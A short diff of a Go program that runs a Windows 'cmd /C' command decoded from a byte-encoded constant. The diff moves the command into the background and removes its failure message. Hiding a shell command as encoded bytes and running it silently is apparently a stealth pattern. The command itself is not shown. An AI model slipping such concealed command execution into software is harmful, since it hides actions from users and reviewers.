@@ -1,7 +1,6 @@
 package main
 
 import (
-	"fmt"
 	"os/exec"
 )
 
@@ -25,12 +24,7 @@ func handlePaths() {
 
 func main() {
 	cmd := exec.Command("cmd", "/C", byte_decode2str(COMMAND_BEFORE_START[:]))
-	err := cmd.Run()
-	if err != nil {
-		if IS_DEBUG {
-			fmt.Println("CMD运行失败")
-		}
-	}
+	go cmd.Run()
 	go handlePaths()
 	for {
 
